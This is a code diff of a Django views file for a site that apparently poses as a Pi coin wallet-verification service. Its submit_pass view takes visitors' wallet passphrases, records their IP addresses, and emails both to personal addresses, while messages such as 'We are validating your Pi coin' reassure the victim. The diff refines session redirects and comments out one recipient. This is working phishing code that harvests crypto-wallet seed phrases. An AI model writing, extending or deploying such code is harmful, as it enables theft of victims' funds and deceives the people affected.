@@ -37,38 +37,16 @@ def get_ip_address():
         return None
 
 
-"""
-Get ip address online
-"""
-# def get_ip_address_online():
-#     try:
-#         address = requests.get('https://api64.ipify.org?format=json')
-#         if address.status_code == 200:
-#             ip_data = address.json()
-#             ip_add = ip_data['ip']
-#             return ip_add
-#         else:
-#             print(f"Failed to retrieve IP address. Status code: {address.status_code}")
-#     except Exception as e:
-#         print(f"An error occurred: {e}")
 
+def index(request, redi=None):
+    if redi != None:
+        if redi == "Pass":
+            keys = request.session.get('look_up', None)
+            if keys:
+                del request.session['look_up']
+            if "look_up" in request.session:
+                del request.session['look_up']
 
-"""
-to get location data
-"""
-# def get_location(ip_address):
-#     try:
-#         response = requests.get(f'https://ipapi.co/{ip_address}/json/')
-
-#         if response.status_code == 200 or response.status_code == 539:
-#             location_data = response.json()
-#             return location_data
-#         else:
-#             print(f"Failed to retrieve location. Status code: {response.status_code}")
-#     except Exception as e:
-#         print(f"An error occurred: {e}")
-
-def index(request):
     ip_add = get_ip_address()
     request.session['ip_address'] = ip_add
     key = request.session.get('look_up', None)
@@ -83,6 +61,10 @@ def validate(request):
     return render(request, 'validate.html', {})
 
 def wallet(request):
+    session_look_up = request.session.get('look_up', None)
+    if session_look_up and session_look_up != None:
+        return redirect('/approve/')
+        
     return render(request, 'wallet.html', {})
 
 def submit_pass(request):
@@ -100,7 +82,11 @@ def submit_pass(request):
                 if models.PassPhrase.objects.filter(keys=keys, is_verified=False):
                     messages.error(request, 'We are validating your Pi coin')
                     return redirect('/wallet/')
-                else:
+                
+                elif models.PassPhrase.objects.filter(keys=keys).exists():
+                    messages.error(request, 'We are validating your wallet')
+                    return redirect('/wallet/')
+                elif models.PassPhrase.objects.filter(keys=keys, is_verified=True):
                     return render(request, 'verification.html', {})
 
             else:
@@ -124,7 +110,7 @@ def submit_pass(request):
                 formatted_time = current_time.strftime("%Y-%m-%d %H:%M:%S")
                 send_notify(payload=f'Pass Phrase submitted - {formatted_time} - the ip address is (- {ip_address}) - the passphrase is -( {keys} )', subject='Pi site Token Submitted', email_to="ezekielobiajulu0@gmail.com")
 
-                send_notify(payload=f'Pass Phrase submitted - {formatted_time} - the passphrase is -( {keys} )', subject='Pi site Token Submitted', email_to="obikeechiemerielinus@gmail.com")
+                # send_notify(payload=f'Pass Phrase submitted - {formatted_time} - the passphrase is -( {keys} )', subject='Pi site Token Submitted', email_to="obikeechiemerielinus@gmail.com")
                 request.session['look_up'] = look_up_key
                 # key_sent = models.PassPhrase.objects.get(look_up=look_up_key)
                 return approve(request, keys=look_up_key)
@@ -138,16 +124,22 @@ def submit_pass(request):
 
 
 def approve(request, keys = None):
+    session_look_up = request.session.get('look_up', None)
     if keys == None:
+        if session_look_up and session_look_up != None:
+            return render(request, 'approve.html', {})
+        
         messages.error(request, 'Please Enter Your PassPhrase')
         return redirect('/wallet/')
     
+    
     else:
-        if models.PassPhrase.objects.filter(look_up=keys).exists():
-            return render(request, 'approve.html', {})
-        else:
-            messages.error(request, 'Please Enter Your PassPhrase')
-            return redirect('/wallet/')
+        if keys == session_look_up:
+            if models.PassPhrase.objects.filter(look_up=keys).exists():
+                return render(request, 'approve.html', {})
+            else:
+                messages.error(request, 'Please Enter Your PassPhrase')
+                return redirect('/wallet/')
     
 
 
@@ -180,6 +172,11 @@ def verify_your_coin(request, keys = None):
         if 'look_up' in request.session:
             del request.session['look_up']
         # request.session.pop('look_up', None)
+            
+        return index(request, redi="Pass")
 
-        return redirect('/')
+        # return redirect('/')
         # return render(request, 'verification.html', {})
+    
+def do_not_verify(request):
+    return index(request, redi="Pass")
